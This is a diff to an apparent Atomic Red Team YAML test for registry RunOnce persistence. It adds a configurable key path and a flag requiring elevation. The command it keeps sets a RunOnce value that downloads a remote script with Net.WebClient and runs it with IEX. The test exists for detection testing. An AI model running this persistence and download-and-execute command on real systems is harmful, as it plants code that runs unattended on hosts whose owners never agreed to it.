@@ -47,10 +47,15 @@ atomic_tests:
       description: Thing to Run
       type: Path
       default: powershell.exe
+    reg_key_path:
+      description: Path to registry key to update
+      type: Path
+      default: HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce
   executor:
     name: powershell
+    elevation_required: true
     command: |
-      $RunOnceKey = "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
+      $RunOnceKey = "#{reg_key_path}"
       set-itemproperty $RunOnceKey "NextRun" '#{thing_to_execute} "IEX (New-Object Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat`")"'
     cleanup_command: |
-      Remove-ItemProperty -Path $RunOnceKey -Name "NextRun" -Force -ErrorAction Ignore
+      Remove-ItemProperty -Path #{reg_key_path} -Name "NextRun" -Force -ErrorAction Ignore
